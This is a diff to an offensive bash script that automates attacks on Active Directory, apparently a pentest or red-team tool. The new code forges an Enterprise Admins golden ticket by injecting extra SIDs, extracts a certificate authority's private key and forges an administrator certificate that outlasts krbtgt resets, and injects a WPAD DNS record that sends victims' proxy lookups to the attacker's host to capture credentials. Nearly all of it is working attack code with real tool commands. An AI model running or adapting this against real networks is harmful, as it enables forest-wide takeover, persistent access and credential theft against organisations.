@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.53.0"
+readonly VERSION="1.54.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 KERBRUTE_RC4_DEAD=0               # set when the DC rejects RC4 (KDC_ERR_ETYPE_NOSUPP) → kerbrute unusable, spray via netexec
@@ -2330,6 +2330,53 @@ phase_post_da() {
         [[ -f "$OUTDIR/silver_cifs_Administrator.ccache" ]] \
             && loot "★ Silver ticket forged (cifs/${DC_FQDN}) → silver_cifs_Administrator.ccache"
     fi
+
+    # --- SID HISTORY injection: an Enterprise-Admins golden ticket ---------------------
+    # The PAC's ExtraSids field IS the SID-history mechanism. Forging a golden ticket that
+    # carries the Enterprise Admins SID (domainSID-519) as an extra SID yields a ticket
+    # that is EA-privileged forest-wide — an escalation ABOVE plain DA (forest root) and a
+    # persistence primitive that a krbtgt reset in ONE domain doesn't fully revoke. In a
+    # single domain / forest root, domainSID-519 IS Enterprise Admins; in a child domain it
+    # escalates toward the root. Standard admin RIDs are added as groups for completeness.
+    subsection "SID history → Enterprise Admins golden ticket (ExtraSids)"
+    run "impacket-ticketer -nthash <krbtgt> -domain-sid $sid -extra-sid ${sid}-519 -groups 512,513,518,519,520 -domain $DOMAIN Administrator"
+    ( cd "$OUTDIR" && impacket-ticketer -nthash "$krbtgt" -domain-sid "$sid" -extra-sid "${sid}-519" \
+        -groups 512,513,518,519,520 -domain "$DOMAIN" Administrator >/dev/null 2>&1 \
+        && mv -f Administrator.ccache golden_EnterpriseAdmin_Administrator.ccache 2>/dev/null )
+    [[ -f "$OUTDIR/golden_EnterpriseAdmin_Administrator.ccache" ]] \
+        && loot "★ SID-history (Enterprise Admins) ticket → golden_EnterpriseAdmin_Administrator.ccache  (forest-wide persistence)"
+
+    # --- GOLDEN CERTIFICATE: back up the CA cert+key, forge certs offline forever -------
+    # Independent of krbtgt: with the CA's own private key we can FORGE a client-auth cert
+    # for ANY principal (incl. Administrator) that PKINIT accepts until the CA cert expires
+    # — persistence that survives a krbtgt double-reset. Needs the CA config + DA on the CA
+    # host (we are DA), both already in hand.
+    if have certipy; then
+        subsection "Golden Certificate (CA private-key backup → forge any principal)"
+        _adcs_setauth
+        local caname; caname=$(grep -hioP 'CA Name\s*:\s*\K\S+' "$OUTDIR"/certipy_*find*.txt "$OUTDIR"/certipy_full_find.txt 2>/dev/null | head -1)
+        [[ -z "$caname" ]] && caname=$(_adcs_full_find | grep -ioP 'CA Name\s*:\s*\K\S+' | head -1)
+        if [[ -z "$caname" ]]; then
+            info "  Golden Certificate: no CA found in this domain → skipping"
+        else
+            local bout; bout=$( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy ca "${_ADCS_AUTH[@]}" \
+                -ca "$caname" -backup -dc-ip "$DC_IP" 2>&1 ); echo "$bout" | tee -a "$LOGFILE"
+            local capfx; capfx=$(grep -oiP "(?:Saved|Wrote).*to '\K[^']+\.pfx" <<<"$bout" | tail -1 | xargs -r basename)
+            [[ -z "$capfx" ]] && capfx=$(ls -t "$OUTDIR"/*.pfx 2>/dev/null | grep -iE "$caname|ca" | head -1 | xargs -r basename)
+            if [[ -n "$capfx" && -f "$OUTDIR/$capfx" ]]; then
+                loot "★ CA cert+key backed up → $capfx (the domain's PKI root key — guard it)"
+                rb_record "Golden Certificate: extracted CA private key ($caname)" \
+                          "echo 'Manual: rotate the CA key pair — a stolen CA key cannot be revoked piecemeal'"
+                run "certipy forge -ca-pfx $capfx -upn administrator@$DOMAIN -sid ${sid}-500"
+                ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" certipy forge -ca-pfx "$capfx" -upn "administrator@$DOMAIN" \
+                    -sid "${sid}-500" -out golden_cert_administrator.pfx >/dev/null 2>&1 )
+                [[ -f "$OUTDIR/golden_cert_administrator.pfx" ]] \
+                    && loot "★★ Golden Certificate forged → golden_cert_administrator.pfx  (certipy auth -pfx … any time, survives krbtgt reset)"
+            else
+                warn "  Golden Certificate: CA backup produced no PFX (CA host RRP/registry unreachable) — do it manually with the CA config"
+            fi
+        fi
+    fi
 }
 
 # A string that plausibly IS a password (safe to spray ONLINE across every account):
@@ -2544,6 +2591,29 @@ phase_relay() {
         fi
     elif [[ "$DO_ABUSE" == "1" ]]; then
         info "Relay/coercion needs a live listener. For automatic attempt: AUTO_RELAY=1 LHOST=${lhost:-<ip>} $0 ..."
+    fi
+
+    # --- ADIDNS: inject a WPAD record → funnel victim proxy lookups to us --------------
+    # By default ANY authenticated user can add a DNS node to the AD-integrated zone. The
+    # DC's WPAD *query-block* list stops the auto-response but NOT a real record, so adding
+    # wpad → our IP makes clients fetch our proxy config (a coercion/credential funnel).
+    # Only useful with a listener up, and it mutates the zone, so gate it on AUTO_RELAY and
+    # always record a rollback. name is a var, IP auto-derived — nothing hard-coded.
+    if [[ "$DO_ABUSE" == "1" && "${AUTO_RELAY:-0}" == "1" && "$CAP_LDAP" == "1" ]] && have bloodyAD; then
+        if [[ -z "$lhost" ]]; then
+            warn "ADIDNS: no callback IP (export LHOST) → skipping WPAD injection"
+        else
+            subsection "ADIDNS · inject wpad → $lhost"
+            local ba; mapfile -t ba < <(bloody_args)
+            run "bloodyAD add dnsRecord wpad $lhost --dnstype A"
+            if bloodyAD "${ba[@]}" add dnsRecord wpad "$lhost" --dnstype A 2>&1 | tee -a "$LOGFILE" | grep -qiE 'success|added|created'; then
+                loot "★ ADIDNS wpad record added → $lhost (clients doing WPAD now reach you; pair with a WPAD/relay listener)"
+                rb_record "ADIDNS: added wpad A → $lhost" \
+                          "bloodyAD ${ba[*]} remove dnsRecord wpad '$lhost' --dnstype A"
+            else
+                warn "ADIDNS: wpad injection failed (zone locked down, record exists, or no write) — see log"
+            fi
+        fi
     fi
 
     subsection "Relay playbook (run these yourself — needs your listener)"
